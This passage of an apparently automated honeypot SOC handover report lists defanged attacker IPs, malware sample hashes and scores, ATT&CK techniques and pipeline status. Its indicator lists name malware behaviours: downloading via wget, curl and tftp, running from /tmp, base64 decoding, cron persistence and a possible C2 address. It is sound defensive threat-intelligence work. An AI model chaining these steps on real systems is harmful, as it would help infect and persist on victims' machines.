| `66.132.195[.]39` | **2** | 2026-09-04 08:45 | 2026-09-04 08:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | **2** | 2026-09-04 10:20 | 2026-09-04 10:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-09-04 12:28 | 2026-09-04 12:48 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-09-04 12:19 | 2026-09-04 12:19 | 5s | 0 | `T1592` | 🟢 LOW |
| `116.255.159[.]152` | 1 | 2026-09-04 11:38 | 2026-09-04 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.96[.]129` | 1 | 2026-09-04 09:22 | 2026-09-04 09:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]38` | 1 | 2026-09-04 10:53 | 2026-09-04 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.165.28[.]100` | 1 | 2026-09-04 07:30 | 2026-09-04 07:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]3` | 1 | 2026-09-04 07:30 | 2026-09-04 07:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-09-04 10:06 | 2026-09-04 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `189.237.228[.]193` | 1 | 2026-09-04 09:21 | 2026-09-04 09:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-04 07:42 | 2026-09-04 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.211.212[.]252` | 1 | 2026-09-04 12:50 | 2026-09-04 12:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]117` | 1 | 2026-09-04 09:08 | 2026-09-04 09:08 | 2s | 0 | `T1592` | 🟢 LOW |
| `200.69.60[.]131` | 1 | 2026-09-04 11:24 | 2026-09-04 11:24 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]81` | 1 | 2026-09-04 11:19 | 2026-09-04 11:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-09-04 12:24 | 2026-09-04 12:24 | 9s | 0 | `T1592` | 🟢 LOW |
| `38.250.156[.]3` | 1 | 2026-09-04 10:25 | 2026-09-04 10:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]240` | 1 | 2026-09-04 11:45 | 2026-09-04 11:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.159.74[.]181` | 1 | 2026-09-04 08:03 | 2026-09-04 08:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-09-04 08:35 | 2026-09-04 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-09-04 12:35 | 2026-09-04 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-09-04 09:36 | 2026-09-04 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-04 07:39 | 2026-09-04 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-09-04 11:36 | 2026-09-04 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.201.15[.]135` | 1 | 2026-09-04 06:59 | 2026-09-04 06:59 | 19s | 0 | `T1592` | 🟢 LOW |
| `49.72.212[.]22` | 1 | 2026-09-04 09:08 | 2026-09-04 09:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.7.64[.]228` | 1 | 2026-09-04 12:02 | 2026-09-04 12:02 | 12s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]132` | 1 | 2026-09-04 08:20 | 2026-09-04 08:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]204` | 1 | 2026-09-04 11:35 | 2026-09-04 11:35 | 18s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-09-04 08:36 | 2026-09-04 08:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-09-04 07:39 | 2026-09-04 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.171.224[.]59` | 1 | 2026-09-04 09:15 | 2026-09-04 09:15 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.79.115[.]59` | US | Linode | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `195.178.110[.]232` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `200.69.60[.]131` | AR | SION S.A | **100** ⚠️ | 3 |
| `45.159.74[.]181` | AM | LIR LLC | **100** ⚠️ | 3 |
| `213.230.92[.]81` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 2 |
| `80.89.199[.]242` | RU | 'Ch' area end users network | **100** ⚠️ | 6 |
| `66.132.172[.]204` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `156.227.234[.]198` | JP | Cloud Innovation Ltd | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 246 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 222 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 114 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 113 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 113 |

---

## 🔕 False Positive Summary (35 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 14 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 352 cases |
| Tool 34  | Credential Extractor        | ✅ 257 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 35 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 221 priority case(s) shown individually · 53 recon entry/entries in table (23 group(s) consolidating 66 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-04T14:07:09Z_
